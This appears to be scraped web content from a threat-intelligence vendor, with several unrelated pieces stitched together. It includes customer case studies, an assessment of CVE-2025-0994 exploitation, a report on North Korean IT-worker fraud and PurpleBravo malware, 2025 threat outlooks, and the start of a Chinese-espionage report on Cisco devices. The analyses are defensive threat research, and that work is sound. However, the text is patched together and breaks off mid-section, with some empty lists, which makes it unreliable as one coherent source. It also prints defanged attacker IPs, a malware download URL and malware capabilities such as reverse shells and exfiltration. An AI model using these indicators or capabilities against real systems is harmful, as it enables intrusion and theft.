        <p>Continuous monitoring of your first-party attack surface — everything in your network and systems that can be accessed from the internet — is resource-intensive and challenging, especially given that employees and contractors often spin up assets outside your security team’s purview. This should be a major concern, as 76% of organizations have suffered a cyberattack that started with the exploit of an unknown, unmanaged, or poorly managed internet-facing asset (<a href="https://www.techtarget.com/searchsecurity/opinion/Why-companies-need-attack-surface-management-in-2024">TechTarget</a>).</p>
        <p>Before implementing Recorded Future’s <a href="/products/attack-surface-intelligence">Attack Surface Intelligence Module</a>, Cummins Attack Surface Reduction Analyst Mattheus Bittick said his team spent around 80 hours per week trying to analyze and map the company’s external attack surface. And even then, the team was blind to around 20% of the landscape.</p>
        <p>With no capacity for continuous scanning and information-gathering and no existing inventory specific to external-facing assets, Bittick’s team was unable to prioritize risks based on the attacker’s perspective. And since the company has had an internet presence for a long period of time, there was a large unexplored landscape of unknown unknowns and abandoned infrastructure.</p>
        <p>Now, Attack Surface Intelligence is a central technology for the Cummins Attack Surface Risk Management Program.</p>
        <p><em>“The first tool I go to every morning is Attack Surface Intelligence. What’s new today? What’s going on that we need to prioritize and triage? Recorded Future shows us how we can take action, and takes our risk assessments to the next level.”</em> — Mattheus Bittick, Attack Surface Reduction Analyst, Cummins</p>
        <p>Thanks to automated discovery and attribution of assets associated with the organization, Bittick and team get a real-time view of their external attack surface, from the same perspective as an attacker. This increased visibility into key areas of risk like vulnerabilities, misconfigurations, and shadow IT has helped Cummins reduce its vulnerable attack surface by 51% over a period of six months. And by removing key areas of risk and decommissioning forgotten infrastructure, the company has reduced its cyber insurance premiums by 32% year-over-year.</p>
        <h2>Novavax Proactively Monitors for Third-Party Vendor Breaches</h2>
        <p><em>“We sharpened a lot of processes by introducing Third-Party Intelligence to our risk assessments, so we can make informed decisions about the vendors we do business with…[Recorded Future] gives us an opportunity to launch an investigation to see what the vendor has access to, what we need to be concerned about, and how we can better protect ourselves.”</em> — Nathalie Salisbury, Strategic Threat Intelligence Analyst, Novavax (Watch the full video <a href="/videos/novavax">here</a>)</p>
        <p>Since third-party vendors aren’t always held to the same standards as enterprise organizations, those with spotty security hygiene can become the soft underbelly of your attack surface. <a href="https://www.verizon.com/business/resources/Tdd9/reports/2024-dbir-data-breach-investigations-report.pdf">According to the 2024 Verizon Data Breach Investigation Report</a>, 15% of breaches involved a third party or supplier. And the <a href="https://www.ibm.com/downloads/documents/us-en/107a02e94948f4ec">IBM Cost of a Data Breach 2024 Report</a> found that the average cost of a breach increased by $240,599 when it came via a third party.</p>
        <p>Making matters worse, supply chain partners often delay or withhold disclosure of security incidents due to concerns about reputation and liability. As they take time to investigate and formulate damage-control strategies, the companies that rely on them may be unaware that their own systems are under attack or that their data has been compromised.</p>
        <p>Nathalie Salisbury, Strategic Threat Intelligence Analyst at <a href="/case-study/novavax">Novavax</a>, says that Recorded Future’s <a href="/products/third-party-intelligence">Third-Party Intelligence Module</a> shines a light on these risks before vendors disclose them.</p>
        <p>“A couple of times now, Recorded Future has alerted us to something prior to the third-party vendor,” she said. “That’s huge when we’re trying to protect our data. That gives us an opportunity to launch an investigation and see what the compromised vendor had access to, [what] we need to be concerned about, and [how to] evaluate our overall third-party risk.”</p>
        <p>As a result, Recorded Future is a critical part of the team’s proactive approach to managing their third-party attack surface, both in evaluating new vendors and continuously monitoring existing ones.</p>
        <h2>INVESTBANK Continuously Monitors and Protects Against Vulnerabilities</h2>
        <p><em>“Vulnerability Intelligence provides access to a large database of exploits and vulnerabilities so that we can remit them faster and implement compensation controls until a patch is released.”</em> — Riyad Jazmawi, Head of Information Security. (Read the full case study <a href="/case-study/investbank">here</a>).</p>
        <p>Vulnerabilities continue to be one of the top initial access vectors for threat actors. In fact, 2024 might have been a watershed for vulnerability exploitation. When Verizon looked at the critical paths attackers use to initiate breaches, <a href="https://www.verizon.com/business/resources/Tdd9/reports/2024-dbir-data-breach-investigations-report.pdf">their research found</a> that vulnerability exploitation grew 3X year-over-year.</p>
        <p>This will come as little surprise to those who’ve tracked prominent ransomware groups over the past year. The exploitation of Progress Software’s <a href="/blog/2023-threat-analysis-and-2024-predictions">MOVEit</a> and other Managed File Transfer (MFT) products, such as <a href="/blog/cleo-mft-cve-2024-50623-vulnerability-analysis">Cleo MFT</a>, have enabled threat actors to successfully pull off a number of large-scale breaches.</p>
        <p><a href="/case-study/investbank">INVESTBANK</a> wanted to respond more productively to zero-day exploits and vulnerabilities being exploited in the wild. As a fast-moving organization with many digital services, it needed to ensure that it could maintain continuous awareness of any PoCs or critical vulnerabilities in its tech stack.</p>
        <p>Recorded Future’s <a href="/products/vulnerability-intelligence">Vulnerability Intelligence Module</a> has helped the company improve its defenses against vulnerabilities.</p>
        <p>“Vulnerability Intelligence provides access to a large database of exploits and vulnerabilities so that we can remit them faster and implement compensation controls until a patch is released,” said Riyad Jazmawi, Head of Information Security.</p>
        <p>To reduce risk, organizations must have visibility into the vulnerabilities in their tech stacks, and they need the context to make patching prioritization decisions. <a href="https://www.verizon.com/business/resources/Tdd9/reports/2024-dbir-data-breach-investigations-report.pdf">Verizon</a> found that it takes 55 days to remediate 50% of CISA Known Exploited Vulnerabilities (KEV) once patches become available.</p>
        <p>With Recorded Future’s Vulnerability Intelligence, you can pinpoint and take action on vulnerabilities to keep attackers from gaining access to your network and data.</p>
        <h2>Conclusion</h2>
        <p>As a security leader, you need visibility into any first-party or third-party asset that could be targeted and exploited by threat actors — and you need context to understand how to prioritize and mitigate threats.

        <h2>Insikt Group’s Assessment of CVE-2025-0994</h2>
        <p>Indicators of compromise (IoCs) shared by Trimble suggest that the vulnerability is being exploited to deliver custom Rust-based loaders capable of loading VShell and <a href="/blog/detect-cobalt-strike-inside-look">Cobalt Strike</a> into memory. Additionally, the threat actors delivered an obfuscated JavaScript payload located in the “%TEMP%” folder, two unknown files, three malicious executables with randomized, alphanumeric filenames (for example, “fq1u4t83[.]exe”), and two files masquerading as legitimate services (“winpty.dll” and “winpty-agent[.]exe”).</p>
        <p>The malicious files were likely downloaded into the victim's environment from threat actor-controlled Cobalt Strike C2 servers.</p>
        <p>Based on the IoCs shared by Trimble, the threat actors used <a href="https://app.recordedfuture.com/portal/intelligence-card/ip%3A192.210.239.172/overview?organization=uhash:5cJsHMHeSM">192.210.239[.]172:3219</a> and <a href="https://app.recordedfuture.com/portal/intelligence-card/ip%3A192.210.239.172/overview?organization=uhash:5cJsHMHeSM">192.210.239[.]172:4219</a> as staging infrastructure. Insikt Group has validated this IP address as a C2 server for <a href="https://app.recordedfuture.com/portal/intelligence-card/JLHNoH/overview?organization=uhash:5cJsHMHeSM">Cobalt Strike</a>.</p>
        <p>There is insufficient evidence to definitively confirm which files were transferred from the threat actor’s infrastructure; however, the obfuscated alphanumeric-named executables stored in the “\Temp” folder or the JavaScript payload are two possibilities.</p>
        <p>At the time of writing, there were 111 exposed Cityworks instances on Shodan, 21% of which are vulnerable based on identified version numbers. The majority of exposed instances are also geolocated in the US and include multiple .gov domains.</p>

          <img loading="lazy" alt="insikt_group_logo" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <h2>Executive Summary</h2>
        <p>In an era in which remote work has become the norm, North Korea has seized the opportunity to manipulate hiring processes, using fraudulent information technology (IT) employment to generate revenue for the regime. North Korean IT workers infiltrate international companies and secure remote positions under false identities. These operatives not only violate international sanctions but also pose severe cybersecurity threats, engaging in fraud and data theft and potentially disrupting business operations.</p>
        <p>Beyond financial fraud, these IT workers have been linked to cyber espionage. Insikt Group tracks PurpleBravo (formerly Threat Activity Group 120 [TAG-120]), a North Korean-linked cluster that overlaps with the “Contagious Interview” campaign, which primarily targets software developers in the cryptocurrency industry. The campaign employs malware such as BeaverTail, an infostealer that gathers sensitive information; InvisibleFerret, a cross-platform Python backdoor; and OtterCookie, a tool used to establish persistent access on compromised systems. At least three organizations in the broader cryptocurrency space were targeted by PurpleBravo between October and November 2024: a market-making company, an online casino, and a software development company.</p>
        <p>The findings also highlight North Korea’s expansion into other areas of fraud, with the establishment of front companies that mimic legitimate IT firms. TAG-121, a separate cluster of activity, has been identified as operating a network of these companies across China. Each front company spoofs a different legitimate organization by copying large parts of their website. These entities create an added layer of deniability and make detection more challenging, allowing North Korean actors to further embed themselves in global IT supply chains.</p>
        <p>The implications of this threat are far-reaching. Organizations that unknowingly hire North Korean IT workers may be in violation of international sanctions, exposing themselves to legal and financial repercussions. More critically, these workers almost certainly act as insider threats, stealing proprietary information, introducing backdoors, or facilitating larger cyber operations. Given North Korea’s history of financial theft, the risks extend beyond individual companies to the broader global financial system and national security interests.</p>
        <p>To mitigate these threats, organizations must adopt stringent identity verification measures, ensuring that remote hires undergo thorough screening. This includes requiring video interviews, notarized identification documents, and continuous monitoring of remote workers for anomalies. Employers should also implement technical controls to detect unauthorized access, restrict data exposure, and flag suspicious remote connections. Awareness and training for human resources (HR) teams and IT security personnel are essential in preventing these actors from infiltrating critical business operations.</p>
        <p>While the threat posed by North Korean IT workers is a fraud issue, it is also a key component of a sophisticated cyber strategy that financially sustains an internationally sanctioned regime. As these operations continue to evolve, businesses, governments, and cybersecurity organizations must work together to close the gaps that enable North Korea to exploit the remote work environment.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>North Korea’s use of IT workers to secure fraudulent employment and execute coordinated cyber campaigns highlights its evolving tactics to fund its military programs while undermining global intellectual property security.</li>
          <li>Insikt Group assesses that PurpleBravo has targeted at least seven entities, three of which are in the cryptocurrency sector, including a market-making firm, an online casino, and a software company.</li>
          <li>Insikt Group found evidence that PurpleBravo uses Astrill VPN to manage its command-and-control (C2) servers.</li>
          <li>PurpleBravo was found posting job advertisements on at least three hiring websites, Telegram, and GitHub.</li>
          <li>Insikt Group identified at least seven suspected North Korean-linked front companies operating in China spoofing legitimate IT firms in China, India, Pakistan, Ukraine, and the United States (US).</li>
          <li>Organizations should implement robust technical safeguards, such as, where feasible, disabling remote desktop software, conducting regular checks of open ports across networks, deploying insider threat monitoring, and geolocating devices.</li>
          <li>Insikt Group expects to continue to see groups like PurpleBravo and TAG-121 exploit the remote work environment, threatening global IT supply chains and intellectual property.</li>
          <li>North Korea’s shift toward fraudulent remote employment and front companies will likely outpace traditional hiring protocol checks, driving organizations and governments to adopt more rigorous identity verification, enhanced remote work security, and robust international intelligence-sharing to counter this expanding threat.</li>
        </ul>
        <h2>Background</h2>
        <p>On January 23, 2025, the US Department of Justice (US DOJ) <a href="https://www.justice.gov/opa/pr/two-north-korean-nationals-and-three-facilitators-indicted-multi-year-fraudulent-remote">indicted</a> two North Korean nationals and three facilitators for remote worker fraud that enriched the North Korean regime. In the indictment, the US DOJ described a six-year scheme in which two US citizens and one Mexican national conspired with North Korean IT workers to remotely work for at least 64 US companies. Payments from ten companies generated at least $866,255 in revenue that was laundered through a Chinese bank account. In addition to the indictment, stories of organizations and individuals that have come across North Korean IT workers can be regularly found in open sources (<a href="https://x.com/zachxbt/status/1824047425822310580">1</a>, <a href="https://sohay666.github.io/article/en/reversing-scam-interview-base-on-js-project.html">2</a>, <a href="https://www.knowbe4.com/press/knowbe4-issues-warning-to-organizations-after-hiring-fake-north-korean-employee">3</a>). Besides sanctions violations, the threat from these workers, whether stealing sensitive data or installing malware on internal systems, presents unique challenges to organizations, especially in remote work environments.</p>
        <p>North Korea remains highly isolated from the outside world due to the regime’s strict control over goods, people, and information, as well as international sanctions placed upon the country. Despite this, Pyongyang’s leadership is <a href="/research/north-korea-internet-activity">well-versed</a> in exploiting emerging technologies to fund its operations. As sanctions have tightened, the regime <a href="/research/north-korea-cyber-activity">adapted</a> by escalating illicit activities, including smuggling and cybercrime. In recent years, the regime has achieved significant <a href="/research/crypto-country-north-koreas-targeting-cryptocurrency">success</a> in stealing from traditional financial institutions and digital assets like cryptocurrency. Between 2020 and 2024, the rise of remote work created new opportunities for North Korea to deploy skilled IT workers who infiltrate global companies under false identities. Their activities directly support the regime’s military programs while posing a significant threat to industries reliant on intellectual property.</p>
        <p>Research into North Korean IT workers has focused on the following aspects of the threat: North Korean IT workers gaining fraudulent <a href="https://cloud.google.com/blog/topics/threat-intelligence/mitigating-dprk-it-worker-threat">employment</a> through proxies; North Korean <a href="https://www.sentinelone.com/labs/dprk-it-workers-a-network-of-active-front-companies-and-their-links-to-china/">front companies</a>, often in the software development space, imitating legitimate organizations; and <a href="https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west">fake</a> employment opportunities targeting software developers in cryptocurrency and AI, among other industries. Other research has established <a href="https://unit42.paloaltonetworks.com/fake-north-korean-it-worker-activity-cluster/">links</a> between IT workers and ongoing malicious campaigns by North Korean threat actors.</p>
        <h2>Threat Analysis</h2>
        <h3>PurpleBravo</h3>
        <p>The Contagious Interview campaign, first <a href="https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/">documented</a> in November 2023, targeted software developers primarily in the cryptocurrency space and was attributed to North Korea. The campaign used the JavaScript infostealer BeaverTail, the cross-platform Python backdoor InvisibleFerret, and most recently OtterCookie, a new backdoor <a href="https://jp.security.ntt/tech_blog/contagious-interview-ottercookie">identified</a> in December 2024. The group responsible for this activity is known as CL-STA-0240, Famous Chollima, and Tenacious Pungsan in open sources. Insikt Group has given this cluster of activity the designation PurpleBravo (formerly TAG-120).</p>
        <h4>PurpleBravo’s Fraudulent Profiles</h4>
        <p>On December 3, 2024, a developer posted a <a href="https://sohay666.github.io/article/en/reversing-scam-interview-base-on-js-project.html">blog</a> about their experience with a suspected PurpleBravo operator. An individual claiming to be a recruiter contacted them about a job offer and then followed up with an interview. During the interview, the interviewer asked the developer to download a coding challenge from a repository. The developer realized there was a malicious function in the file and ended the interview. While the developer does not attribute the malware or actor, Insikt Group assesses with high confidence the file is a BeaverTail infostealer.</p>
        <p>The interviewer used a LinkedIn account with the name Javier Fiesco, who describes themself as the CTO of AgencyHill99. Further investigation into Javier Fiesco <a href="https://remote3.co/p/javier0923">uncovered</a> an individual with the same name available for work on remote3, a Web3 development job board. The website <em>agencyhill99[.]com</em> was registered on Hostinger on September 13, 2024. As of early February 2025, this website no longer resolved, but it previously <a href="https://urlscan.io/result/cf20d730-529f-42fe-b5dc-befb1d9b8a66">displayed</a> a Hostinger landing page. Research into AgencyHill99 uncovered a job <a href="https://www.levels.fyi/community/thread/GwOc95/we-are-looking-for-4-developers-who-can-develop-our-blockchain-project">posting</a> seeking a developer with blockchain knowledge on <em>levels[.]fyi</em>, with the following contact info:</p>
        <ul>
          <li>Contact us: <em>alexander@agencyhill99[.]com</em></li>
          <li>Recruiter: <em>vision.founder1004@gmail[.]com</em></li>
        </ul>
        <p>Pivoting on the text in the job description returned two private job postings on Upwork (<a href="https://www.upwork.com/en-gb/freelance-jobs/apply/Fullstack-Developer-Needed-React-Tailwind-CSS-Node-Web3-Expert_~021843580619016959863/">1</a>, <a href="https://www.upwork.com/en-gb/freelance-jobs/apply/Frontend-development-for-Token-Voting-Platform_~021844805127046769369/">2</a>). Additionally, a <a href="https://dorahacks.io/hacker/U_6b2d92accc9944/">profile</a> with the name of Lucifer, and what appears to be an AI-generated headshot, who works for AgencyHill99 was observed on the website DoraHacks, which is a hackathon, bounty, and grant organization. The profile on DoraHacks states that AgencyHill99 is looking to hire a developer. Insikt Group also discovered a <a href="https://intch.org/company/agencyhill99">company</a> with the name Agencyhill99 on the website Intch, a part-time and remote job platform. The company posted a “Part-Time IT Developer Opportunity” by an individual with the name Newton Curtis, who is a recruiter at AgencyHill99.</p>

        <p>Insikt Group found several posts in Telegram channels from individuals with <em>@agencyhill99[.]com</em> email addresses advertising jobs. Below is a summary of the posts:</p>
        <ul>
          <li>On September 16, 2024, an account with the username Dale_V and email address <em>ayat@agencyhill99[.]com</em> posted in the Telegram channel “freelancerclients” that they were looking to hire a developer.</li>
          <li>On September 26, 2024, an account with the username jaxtonhol and email address <em>ysai@agencyhill99[.]com</em> posted in the Telegram channel “indeedemploijobeur” that they were looking to hire a developer. On the same day, the account Dale_V using the email <em>ysai@agencyhill99[.]com</em> posted in the Telegram channel “cryptolux_b” that they were looking to hire a blockchain developer. They posted the same message in the “itkita”, “andexzuxiaomichat”, and “usvacancy” channels. On September 27, 2024, Dale_V posted the same message in the “crypto_brazil” and “cryptolux_br” channels.</li>
          <li>On October 2, 2024, Dale_V posted the same message with a new email address, <em>sam@agencyhill99[.]com</em>, in the “fortifiedx_chat”, “family_indonesia_uae_ph”, “cryptolux_br”, and “freelancerclients” channels.</li>
          <li>On October 3, 2024, a user in an Indonesian-language Telegram channel posted a screenshot of an email message they received from PurpleBravo operators.</li>
          <li>On October 9, 2024, Dale_V posted job advertisements in the “andexzuxiaomichat”, “family_indonesia_uae_ph”, “cryptolux_br”, “crypto_brazil”, and “freelancerclients” channels.</li>
          <li>On October 22, 2024, Dale_V posted in the Telegram channel “hiringofm” seeking individuals to help maintain a game called Destiny War, and added the X link, <em>hxxps://twitter[.]com/destinywarnft</em>. It is unclear if the actor controls this X account or game.</li>
          <li>On November 13, 2024, the Telegram user jaxtonhol posted in the Telegram channel “near_jobs” seeking blockchain engineers. The same user posted again on December 7, 2024, in the same channel with the email address <em>ysai@agencyhill99[.]com</em>.</li>
          <li>On November 30, 2024, a Telegram user posted asking if a job offer on LinkedIn from the account mentioned above, Javier Feisco associated with Agencyhill99, was legitimate and shared a screenshot of the message.</li>
        </ul>
        <p><strong>GitHub Repository</strong></p>
        <p>Insikt Group discovered a GitHub repository named agencyhill99 with the email address <em>admin@agencyhill99[.]com</em>. A GitHub user, dev-astro-star, made several commits to the repository between October 9 and 19, 2024. Based on the commits, it appears the website used Firebase, a Google backend service for web applications. The user added a button to download a file at the Google Drive link <em><a href="https://drive.google%5B.%5Dcom/uc?id=166zcmpqj-C7NPltm4iwRolz8XuxqZIXt">https://drive.google[.]com/uc?id=166zcmpqj-C7NPltm4iwRolz8XuxqZIXt</a></em>, which is no longer accessible. The email address <em>admin@agencyhill99[.]com</em> was also added to the repository, along with the Telegram channel <em>hxxps://t[.]me/+2AurfGZWxZo0MDgx</em>, which is also no longer live. The user also added a download link to <em>hxxp://65.108.20[.]73/BattleTank[.]exe</em>, which is no longer live and was later updated to <em>hxxp://65.108.20[.]73[:]3000/BattleTank[.]exe</em>. Port 3000 was open from October 20, 2024, to November 22, 2024, on <em>65.108.20[.]73</em>. The link was then updated to <em>hxxp://locahost[:]3000/BattleTank[.]rar</em>.</p>
        <h4>PurpleBravo Malware and Infrastructure</h4>
        <p>PurpleBravo uses the malware families BeaverTail, InvisibleFerret, and OtterCookie. BeaverTail is a malware family initially distributed via NPM packages as a JavaScript payload and later as executables and downloaders targeting Windows and macOS environments. BeaverTail also acts as an infostealer, gathering cryptocurrency wallet and browser information. InvisibleFerret is a collection of post-compromise payloads that collectively act as a backdoor in victim environments. InvisibleFerret introduces additional malicious payloads into victim environments, performs information stealing and fingerprinting actions within the victim environment, and leverages legitimate protocols and software for C2 communications. Like InvisibleFerret, OtterCookie is a post-compromise malware family used as a backdoor, which establishes C2 connectivity via Socket[.]IO, receives and executes shell commands from C2 servers, and exfiltrates sensitive victim data.</p>
        <p>Insikt Group analyzed BeaverTail, InvisibleFerret, and OtterCookie malware samples (See <strong>Appendix B</strong> for related file hashes). The BeaverTail samples were identified as PE variants targeting Windows environments. These samples included URLs linked to <em>freeconference[.]com</em>, a legitimate conferencing website, which aligns with Unit42’s <a href="https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/">findings</a> of Contagious Interview payloads posing as FreeConference executables. The OtterCookie samples were two separate versions of the malware family; however, static analysis of these samples included strings that demonstrated both samples’ ability to gather and send system fingerprinting information to attacker C2 servers, including strings that indicated OtterCookie is capable of identifying cryptocurrency assets and sensitive information found in specific file types by using regex patterns, including executables, photos, and config and env files, among others.</p>
        <p>The InvisibleFerret samples analyzed were Python scripts with the following functionalities:</p>
        <ul>
          <li>Determining victim device location via local IP address lookup</li>
          <li>Fingerprinting device details (user and hostname)</li>
          <li>Connecting to a Base64-encoded C2 address via HTTP POST requests</li>
          <li>Performing local directory discovery using hard-coded strings</li>
          <li>Creating a reverse shell for SSH session management and data exfiltration</li>
          <li>Copying clipboard data, keylogging, and tracking mouse movements.</li>
        </ul>
        <p>Previous samples of InvisibleFerret were <a href="https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west">analyzed</a> by Zscaler, which described a two-part infection chain in which the initial reconnaissance took place over HTTP traffic and FTP was used for data exfiltration, as shown in <strong>Figure 2</strong>.</p>

        <p>Insikt Group identified 21 PurpleBravo servers between August 2024 and February 2025 (see <strong>Appendix B</strong> for the complete list). The majority of servers use Tier[.]Net hosting, with Majestic Hosting, Stark Industries, Leaseweb Singapore, and Kaopu Cloud HK also being used in this campaign. Insikt Group has previously observed other North Korean threat groups favor many of these hosting providers. In addition to the C2 servers, using Recorded Future Network Intelligence, Insikt Group observed at least seven suspected victims between September 2024 and February 13, 2025. The victims are located in at least six countries, including the United Arab Emirates, Costa Rica, India, Vietnam, Türkiye, and South Korea. Open-source <a href="https://spur.us/astrill-vpn-and-remote-worker-fraud/">research</a> identified Astrill VPN as a favored service by North Korean IT workers, with <a href="https://cloud.google.com/blog/topics/threat-intelligence/mitigating-dprk-it-worker-threat">evidence</a> that they use the service with remote administration tools. Insikt Group also observed network traffic between known Astrill VPN endpoints and PurpleBravo servers, corroborating this connection.</p>

        <p>At least three victims in the cryptocurrency space were identified in the findings summarized below:</p>
        <ul>
          <li>On October 3, 2024, Insikt Group observed likely reconnaissance traffic between a BeaverTail C2 and a market-making company in the cryptocurrency space based in the United Arab Emirates. Shortly after the reconnaissance traffic, we observed likely exfiltration FTP traffic between the same IP addresses.</li>
          <li>On October 15, 2024, Insikt Group observed likely reconnaissance traffic between a BeaverTail C2 and a gambling company that offers online games and sells slot machines in the cryptocurrency space. The company is registered in Costa Rica. Reconnaissance traffic followed by FTP exfiltration traffic was observed between the C2 and the company's infrastructure on November 25 and 26, 2024.</li>
          <li>On October 2, 2024, Insikt Group observed potential FTP exfiltration traffic between a BeaverTail C2 and a software development company based in India that builds blockchain, AI, and mobile, among other applications.</li>

        </ul>
        <h2>Outlook #2: SaaS will make it easier to weaponize stolen credentials.</h2>
        <p>Cybercriminals are increasingly targeting interconnected software-as-a-service (SaaS) applications to gain access to enterprise ecosystems. With the average organization now using <a href="https://www.demandsage.com/saas-statistics/">approximately 371 SaaS apps</a>, and with <a href="https://blog.1password.com/verizon-data-breach-report-2024-analysis/#:~:text=use%20of%20stolen%20credentials%E2%80%9D%20is%20the%20number%20one%20initial%20action%20during%20breaches%2C%20and%20stolen%20credentials%20also%20account%20for%20a%20whopping%2077%25%20of%20Basic%20Web%20Application%20Attacks">77%</a> of SaaS app attacks beginning with stolen credentials, it’s essential to prioritize identity security.</p>
        <p>Credentials are frequently stolen by information-stealing malware, or infostealers, that are built to target a variety of operating systems and mobile devices. Per Recorded Future <a href="/research/2024-annual-report">research</a>, credential theft per device has risen 25% since 2021, increasing the risk of unlocking valuable corporate assets or credential stuffing attacks.</p>
        <h3>Real-world threats:</h3>
        <ul>
          <li>The recent high profile breaches have used credentials <a href="https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion?utm_source=chatgpt.com">stolen</a> from infostealers from as far back as 2020 to gain access to over 165 companies’ cloud storage instances.</li>
          <li><a href="https://www.infosecurity-magazine.com/news/phishing-attack-bypasses-microsoft/">Even with MFA</a>, threat actors were able to use subtle social engineering strategies,to gain access to corporate systems.</li>
        </ul>
        <h3>Priority actions:</h3>
        <ul>

        </ul>
        <h2>Outlook #3: Generative AI will transform social engineering.</h2>
        <p>The <a href="https://www.cnbc.com/2023/11/28/ai-like-chatgpt-is-creating-huge-increase-in-malicious-phishing-email.html">reported</a> 1,265% increase in phishing attacks between Q4 2022 and November 2023 has been attributed to the public release of LLMs like ChatGPT. Spear phishing attacks have become more dangerous now that threat actors can use generative AI to quickly create highly targeted and convincing messages as well as deepfake phone calls and videos (<a href="https://www.techtarget.com/searchsecurity/tip/Generative-AI-is-making-phishing-attacks-more-dangerous">TechTarget</a>).</p>
        <p>In addition to phishing, the increasing availability of sophisticated faceswap and other deepfake technology means more threat actors will be able to produce believable impersonations of company executives, celebrities, and political figures, pulling off increasingly costly scams.</p>
        <h3>Real-world threats:</h3>
        <ul>
          <li>Losses to impersonation scams <a href="https://www.ftc.gov/news-events/data-visualizations/data-spotlight/2024/04/impersonation-scams-not-what-they-used-be#:~:text=Scams%20that%20impersonate%20well%2Dknown,what%20consumers%20reported%20in%202020">topped</a> $1.1 billion in 2023.</li>
          <li><a href="/research/targets-objectives-emerging-tactics-political-deepfakes">26%</a> of politically themed deepfakes were used to commit fraud.</li>

          <li>Ensure processes for transferring money or data are resilient to scams by increasing validation checkpoints and educating employees on suspicious requests</li>
        </ul>
        <h2>Outlook #4: Regulatory demands and AI capabilities will push demand for safer code.</h2>
        <p>New regulations in both the US and EU are pushing software companies to prioritize security. One of the last Biden-era cyber executive orders <a href="https://www.npr.org/2025/01/16/nx-s1-5261112/biden-cybersecurity-executive-order">requires</a> software vendors selling to the US federal government to verify they are using secure software development practices. Meanwhile, the EU amended <a href="https://www.consilium.europa.eu/en/press/press-releases/2024/10/10/eu-brings-product-liability-rules-in-line-with-digital-age-and-circular-economy/">liability</a> laws seek to hold software companies accountable for harm caused by their products.</p>
        <h3>Real-world threats:</h3>
        <ul>
          <li>Recent wide-scaled outages <a href="https://www.informationweek.com/cyber-resilience/crowdstrike-outage-drained-5-4-billion-from-fortune-500-report">caused</a> by defective code in a software update, have caused over $5.4 billion in damages.</li>
          <li><a href="https://securityintelligence.com/articles/log4j-downloads-vulnerable/">40%</a> of Log4J downloads are vulnerable to exploitation as a result of developers downloading insecure versions</li>
        </ul>
        <h3>Priority actions:</h3>
        <ul>
          <li>Ensure your organization is incorporating secure software development <a href="https://csrc.nist.gov/projects/ssdf">frameworks</a> into their operations</li>
        </ul>
        <h2>Outlook #5: Card fraud in 2025: digital deception will evolve.</h2>
        <p>Card fraud is a global, professional ecosystem where cybercriminals specialize in compromising and monetizing payment data through sophisticated digital channels. Attackers are shifting to more nuanced digital strategies that exploit authentication vulnerabilities and create seamless fraud infrastructure.</p>
        <h3>Real-world threats:</h3>
        <ul>
          <li>E-skimming remains the primary compromise method, leveraging easy-to-use kits and CMS vulnerabilities</li>
          <li>Scam websites will employ advanced tactics, such as one-time passcode phishing, to facilitate card theft and enhance their ability to monetize the stolen data more efficiently</li>
          <li>Fraudsters will target weak authentication in 3D Secure and digital wallets</li>
          <li>Social engineering tactics will be scaled into systematic cyber fraud attack chains</li>
        </ul>
        <h3>Priority actions:</h3>

            <content:encoded><![CDATA[
        <p>
          <img loading="lazy" alt="insikt group logo" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <h2>Executive Summary</h2>
        <p>Between December 2024 and January 2025, Recorded Future’s Insikt Group identified a campaign exploiting unpatched internet-facing Cisco network devices primarily associated with global telecommunications providers. Victim organizations included a United States-based affiliate of a United Kingdom-based telecommunications provider and a South African telecommunications provider. Insikt Group attributes this activity to the Chinese state-sponsored threat activity group tracked by Insikt Group as RedMike, which aligns with the Microsoft-named group Salt Typhoon. Using Recorded Future® Network Intelligence, Insikt Group observed RedMike target and exploit unpatched Cisco network devices vulnerable to CVE-2023-20198, a privilege escalation vulnerability found in the web user interface (UI) feature in Cisco IOS XE software, for initial access before exploiting an associated privilege escalation vulnerability, CVE-2023-20273, to gain root privileges. RedMike reconfigures the device, adding a generic routing encapsulation (GRE) tunnel for persistent access.</p>
        <p>RedMike has attempted to exploit more than 1,000 Cisco devices globally. The group likely compiled a list of target devices based on their association with telecommunications providers' networks. Insikt Group also observed RedMike targeting devices associated with universities in Argentina, Bangladesh, Indonesia, Malaysia, Mexico, the Netherlands, Thailand, the United States (US), and Vietnam. RedMike possibly targeted these universities to access research in areas related to telecommunications, engineering, and technology, particularly at institutions like UCLA and TU Delft. In addition to this activity, in mid-December 2024, RedMike also carried out a reconnaissance of multiple IP addresses owned by a Myanmar-based telecommunications provider, Mytel.</p>
        <p>Unpatched public-facing appliances serve as direct entry points into an organization’s infrastructure. Sophisticated Chinese threat activity groups have <a href="https://go.recordedfuture.com/hubfs/reports/cta-2023-1107.pdf">shifted</a> heavily toward exploiting these devices for initial access over the past five years. RedMike’s exploitation of telecommunications infrastructure goes beyond technical vulnerabilities and represents a strategic intelligence threat. Persistent access to critical communications networks enables state-backed threat actors to monitor confidential conversations, manipulate data flows, and disrupt services during geopolitical conflicts. RedMike’s targeting of lawful intercept programs and US political figures highlights the strategic intelligence objectives behind these operations and the national security threat they pose.</p>
        <p>Organizations, particularly those in the telecommunications industry, must prioritize remediating exposed network devices, as unpatched systems remain a key initial access vector for Chinese state-sponsored threat activity groups. Network administrators should implement strict access controls, disable unnecessary web UI exposure, and monitor for unauthorized configuration changes. Individuals should use end-to-end encrypted communication methods for sensitive information, just as the Cybersecurity and Infrastructure Agency (CISA) and the Federal Bureau of Investigation (FBI) recommended, which is crucial to mitigate potential eavesdropping risks.</p>
        <p>Additionally, governments and cybersecurity entities should improve threat intelligence sharing and impose stricter regulatory compliance for network security. While the US sanctions on RedMike-affiliated Sichuan Juxinhe Network Technology signal a more assertive and commendable stance against state-backed cyber espionage in critical infrastructure, robust international cooperation is crucial for effectively countering these persistent threats.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Despite significant media coverage and US sanctions, RedMike continues to compromise telecommunications providers globally, including in the US.</li>
